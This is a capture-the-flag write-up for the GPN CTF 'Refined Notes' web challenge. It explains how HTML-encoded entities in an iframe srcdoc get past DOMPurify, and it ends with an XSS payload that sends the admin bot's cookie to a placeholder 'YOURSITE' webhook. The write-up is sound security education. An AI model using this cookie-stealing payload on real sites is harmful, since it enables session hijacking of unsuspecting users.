# Refined Notes

|||
|-|-|
|  **CTF**  |  [GPN CTF](https://play.ctf.kitctf.de/) [(CTFtime)](https://ctftime.org/event/2257)  |
|  **Author** |  WhoNeedsSleep |
|  **Category** |  Web |
|  **Solves** |  51  |

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/676cb3f3-03e7-4870-b4c6-ea79c8841a6c)

# Solution

This challenge doesn't have source files, so let's visit the two provided sites:

#### Challenge page

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/87d8008f-6597-41e6-86aa-792d7c964eca)

#### Admin bot page

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/ed552124-722c-4b45-8470-e51ecd1691be)

So we can give a UUID to the admin, and the bot will visit it. We can see that if we create a note, we will be redirected to a page with the UUID in the URL. So this UUID can be given to the bot.

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/de16ba3c-f139-43d2-877f-e6aa211a71fe)

If we check the HTML source code of the challenge page, we see:

```html
<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Refined Note Taking App</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/dompurify@3.1.4/dist/purify.min.js"></script>
        <script defer src="/static/index.js"></script>
    </head>
    <body class="bg-gray-100 p-4">
        <div class="max-w-lg mx-auto">
            <h1 class="text-2xl font-bold mb-4">Refined Note Taking App</h1>
            <div id="container" class="mb-4 flex flex-col">
                <iframe id="noteframe" class=" bg-white w-full px-3 py-2 border rounded-md h-60" srcdoc="a"></iframe>
                <textarea type="text" id="note" class="hidden w-full px-3 py-2 border rounded-md h-60" placeholder="Enter your note here"></textarea>
                <button id="submit" class="hidden mt-2 px-4 py-2 bg-blue-500 text-white rounded-md">Add Note</button>
            </div>
        </div>
    </body>
```

We can see that our input is put in the `srcdoc` attribute of the `iframe`. We also see an `index.js` file. Let's check that file:

```js
submit.addEventListener('click', (e) => {
    const purified = DOMPurify.sanitize(note.value);
    fetch("/", {
        method: "POST",
        body: purified
    }).then(response => response.text()).then((id) => {
        window.history.pushState({page: ''}, id, `/${id}`);
        submit.classList.add('hidden');
        note.classList.add('hidden');
        noteframe.classList.remove('hidden');
        noteframe.srcdoc = purified;
    });
});
```
We can see that when we submit a note, it first sanitizes our input with `DOMPurify`. It's using version `3.1.4`; `3.1.5` is the latest version at the moment I am writing this. There is no CVE or known bypass for this version as far as I know.

After sanitizing, it will post it to the backend. If we get a response back, it will put our input `purified` inside `noteframe.srcdoc`.

### So what is the goal of this challenge?

We need to get XSS to steal the cookie of the bot. Most of the time when there is a bot, the goal is to steal the cookie. We need to find a way to get XSS. A DOMPurify bypass is probably not the way. The interesting part is that our input is directly put inside the srcdoc attribute of an iframe.

I first tried to close the srcdoc attribute and add a src attribute. It didn't trigger anything, so I thought it took the input literally and moved on to find some other stuff. But it didn't work because when an iframe contains a src and srcdoc attribute, the srcdoc attribute will take priority.

From [here](https://www.w3.org/TR/2010/WD-html5-20100624/the-iframe-element.html):
`If the src attribute and the srcdoc attribute are both specified together, the srcdoc attribute takes priority. This allows authors to provide a fallback URL for legacy user agents that do not support the srcdoc attribute.`

So you can use other attributes to get XSS here. But the intended way to solve this, which I did during the CTF, was using HTML encoded entities. 

My teammate found this issue on [Github](https://github.com/apostrophecms/sanitize-html/issues/217).

So when using a payload like this `&lt;img src=x:x onerror=alert(1)&gt;`, it will give us an alert:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/65cd3979-e534-4749-81d1-85fe553214fa)

So now we can easily change the payload to send us the cookie:

`&lt;img src=x:x onerror=document.location='YOURSITE/?f='+document.cookie&gt;`

If we send it to the admin bot and check our webhook, we get the flag:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/304ed5df-0c8f-4250-9add-05caa450e1dc)




